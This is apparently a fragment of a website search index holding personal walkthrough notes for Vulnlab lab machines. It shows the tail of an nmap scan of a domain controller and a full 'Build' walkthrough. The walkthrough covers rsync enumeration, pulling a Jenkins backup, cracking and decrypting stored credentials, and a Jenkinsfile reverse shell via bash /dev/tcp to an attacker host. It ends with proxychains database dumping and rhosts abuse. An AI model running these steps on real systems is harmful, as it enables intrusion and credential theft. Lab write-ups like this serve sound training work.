class=\"cl\"\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2024-08-14 13:58:09Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: bruno.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebrunodc.bruno.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:brunodc.bruno.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2023-08-22T06:05:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2024-08-21T06:05:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-08-14T13:59:29+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e 0s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e443/tcp  open  ssl/http      Microsoft IIS httpd 10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Microsoft-IIS/10.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: IIS Windows Server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e tls-alpn:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  http/1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebruno-BRUNODC-CA\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2022-06-29T13:23:01\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2121-06-29T13:33:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e http-methods:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  Potentially risky methods: TRACE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp  open  ssl/ldap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebrunodc.bruno.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:brunodc.bruno.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2023-08-22T06:05:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2024-08-21T06:05:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-08-14T13:59:29+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e 0s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: bruno.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-08-14T13:59:29+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e 0s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebrunodc.bruno.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:brunodc.bruno.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2023-08-22T06:05:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2024-08-21T06:05:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: bruno.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebrunodc.bruno.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:brunodc.bruno.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2023-08-22T06:05:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2024-08-21T06:05:15\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-08-14T13:59:29+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e 0s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-08-14T13:59:29+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e 0s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebrunodc.bruno.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-13T13:54:38\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-02-12T13:54:38\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rdp-ntlm-info:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Target_Name: BRUNO\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: BRUNO\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: BRUNODC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Domain_Name: bruno.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Computer_Name: brunodc.bruno.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Tree_Name: bruno.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Product_Version: 10.0.20348\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  System_Time: 2024-08-14T13:58:49+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eSSDP/UPnP\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Microsoft-HTTPAPI/2.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Service Unavailable\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Host: BRUNODC\u003cspan class=\"p\"\u003e;\u003c/span\u003e OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   date: 2024-08-14T13:58:52\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  start_date: N/A\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   311:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Message signing enabled and required\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eWe read the the changelog in the FTP and discover the user \u003ccode\u003esvc_scan\u003c/code\u003e\u003c/p\u003e","tags":[],"title":"Bruno"},{"content":"Scan :\n22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 472173e26b96cdf91311af40c84dd67f (ECDSA) |_ 256 2b5ebaf372d3b309df25412909f47bf5 (ED25519) 53/tcp open domain PowerDNS | dns-nsid: | NSID: pdns (70646e73) |_ id.server: pdns 512/tcp open exec netkit-rsh rexecd 513/tcp open login? 514/tcp open shell Netkit rshd 873/tcp open rsync (protocol version 31) 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Cache-Control: max-age=0, private, must-revalidate, no-transform | Content-Type: text/html; charset=utf-8 | Set-Cookie: i_like_gitea=403cb3e3906068db; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=GYHXs7TQdbOzsKcKny30oR8By-Q6MTcyMTI0MjAwODM2MTMwNzAzNg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Wed, 17 Jul 2024 18:46:48 GMT | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en-US\u0026#34; class=\u0026#34;theme-auto\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Gitea: Git with a cup of tea\u0026lt;/title\u0026gt; | \u0026lt;link rel=\u0026#34;manifest\u0026#34; href=\u0026#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Allow: HEAD | Allow: GET | Cache-Control: max-age=0, private, must-revalidate, no-transform | Set-Cookie: i_like_gitea=a275bfd19692210f; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=7aCFYOoWpGjTrCHOLcNbUFcmXws6MTcyMTI0MjAxMzU0Mjg2OTg2Nw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Wed, 17 Jul 2024 18:46:53 GMT |_ Content-Length: 0 3306/tcp filtered mysql 8081/tcp filtered blackice-icecap\rEnumerating shared folder:\nnmap -sV --script \u0026#34;rsync-list-modules\u0026#34; -p 873 $target\rOr\nnc -vn $target 873 (UNKNOWN) [127.0.0.1] 873 (rsync) open @RSYNCD: 31.0 \u0026lt;--- You receive this banner with the version from the server @RSYNCD: 31.0 \u0026lt;--- Then you send the same info #list \u0026lt;--- Then you ask the sever to list\rDownload File :\nrsync -av rsync://10.10.71.22/backups/jenkins.tar.gz .\rInteresting file in Users/Admin_/config.xml:\n\u0026lt;hudson.security.HudsonPrivateSecurityRealm_-Details\u0026gt;\u0026lt;passwordHash\u0026gt;#jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG \u0026lt;/passwordHash\u0026gt; \u0026lt;/hudson.security.HudsonPrivateSecurityRealm_-Details\u0026gt;\rPassword cracking :\nhashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt\rtoo long \u0026hellip;\nSO i used a tool :\n/go/bin❯ ./go-decrypt-jenkins -d ../../Downloads/jenkins_configuration/ Searching for files in ../../Downloads/jenkins_configuration/ id: e4048737-7acd-46fd-86ef-a3db45683d4f username: buildadm password: Git1234! usernameSecret: false id: admin name: admin passwordHash: #jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG\rThen modify the Jenkinsfile and the add a reverse shell : pipeline { agent any stages { stage(\u0026#39;Pwned\u0026#39;) { steps { sh \u0026#39;\u0026#39;\u0026#39; bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.3.12/4242 0\u0026gt;\u0026amp;1\u0026#39; \u0026#39;\u0026#39;\u0026#39; } } } }\rThen got the flag in /root/user.txt: VL{bf760d7c76f89f4e07bf4d461ee1c3c2}\rIf we remember we got two filtered ports : 3306 \u0026amp; 8081 . So we going to do a proxychains to access to them because of the firewall . export TERM=xterm-256color\rAccess to MariaDB and list content : proxychains -q mysql -h 10.10.125.92 -u root -P 3306 SHOW DATABASE; SHOW tables from powerdnsadmin; SHOW columns FROM powerdnsadmin.user; SELECT * FROM powerdnsadmin.user;\rGot some credential : 1 | admin | $2b$12$s1hK0o7YNkJGfu5poWx.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq | winston\rMore information : ![[Build_lab.png]]\nWe found Rhosts file with intern and admin so we add them to the powerDNSadmin with our ip address: ![[Build_lab2.png]]\nThen we can connect with rlogin :\nVL{fef779871842b0975faac0a289181ab2}\r","date":"2023-09-07","id":25,"permalink":"/notes/lab/vulnlab/build/","summary":"\u003cp\u003e\u003cstrong\u003eScan\u003c/strong\u003e :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp   open     ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e protocol 2.0\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssh-hostkey:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e256\u003c/span\u003e 472173e26b96cdf91311af40c84dd67f \u003cspan class=\"o\"\u003e(\u003c/span\u003eECDSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  \u003cspan class=\"m\"\u003e256\u003c/span\u003e 2b5ebaf372d3b309df25412909f47bf5 \u003cspan class=\"o\"\u003e(\u003c/span\u003eED25519\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open     domain          PowerDNS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e dns-nsid:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NSID: pdns \u003cspan class=\"o\"\u003e(\u003c/span\u003e70646e73\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  id.server: pdns\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e512/tcp  open     \u003cspan class=\"nb\"\u003eexec\u003c/span\u003e            netkit-rsh rexecd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e513/tcp  open     login?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e514/tcp  open     shell           Netkit rshd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e873/tcp  open     rsync           \u003cspan class=\"o\"\u003e(\u003c/span\u003eprotocol version 31\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3000/tcp open     ppp?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e fingerprint-strings:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   GenericLines, Help, RTSPRequest:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     HTTP/1.1 \u003cspan class=\"m\"\u003e400\u003c/span\u003e Bad Request\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Content-Type: text/plain\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eutf-8\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Connection: close\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Request\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   GetRequest:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     HTTP/1.0 \u003cspan class=\"m\"\u003e200\u003c/span\u003e OK\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Cache-Control: max-age\u003cspan class=\"o\"\u003e=\u003c/span\u003e0, private, must-revalidate, no-transform\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Content-Type: text/html\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eutf-8\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Set-Cookie: \u003cspan class=\"nv\"\u003ei_like_gitea\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e403cb3e3906068db\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003ePath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/\u003cspan class=\"p\"\u003e;\u003c/span\u003e HttpOnly\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003eSameSite\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eLax\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Set-Cookie: \u003cspan class=\"nv\"\u003e_csrf\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eGYHXs7TQdbOzsKcKny30oR8By-Q6MTcyMTI0MjAwODM2MTMwNzAzNg\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003ePath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/\u003cspan class=\"p\"\u003e;\u003c/span\u003e Max-Age\u003cspan class=\"o\"\u003e=\u003c/span\u003e86400\u003cspan class=\"p\"\u003e;\u003c/span\u003e HttpOnly\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003eSameSite\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eLax\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     X-Frame-Options: SAMEORIGIN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Date: Wed, \u003cspan class=\"m\"\u003e17\u003c/span\u003e Jul \u003cspan class=\"m\"\u003e2024\u003c/span\u003e 18:46:48 GMT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     \u0026lt;!DOCTYPE html\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     \u0026lt;html \u003cspan 